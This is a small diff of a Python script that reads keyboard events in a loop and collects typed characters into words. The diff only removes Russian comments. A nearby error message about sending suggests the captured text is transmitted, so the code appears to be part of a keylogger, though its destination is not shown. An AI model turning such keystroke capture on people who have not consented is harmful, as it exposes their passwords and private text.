@@ -42,11 +42,11 @@ while True:
             except Exception as e:
                 print(f"Ошибка при отправке: {e}")
             break
-        elif len(key) == 1 or key in ['space', 'enter', 'tab']:  # только текстовые символы
+        elif len(key) == 1 or key in ['space', 'enter', 'tab']:  
             try:
-                # Пробуем получить символ по раскладке
+                
                 char = keyboard.get_typed_strings([event])
-                char = next(char, '')  # Получить из генератора
+                char = next(char, '') 
                 word += char
 
             except:
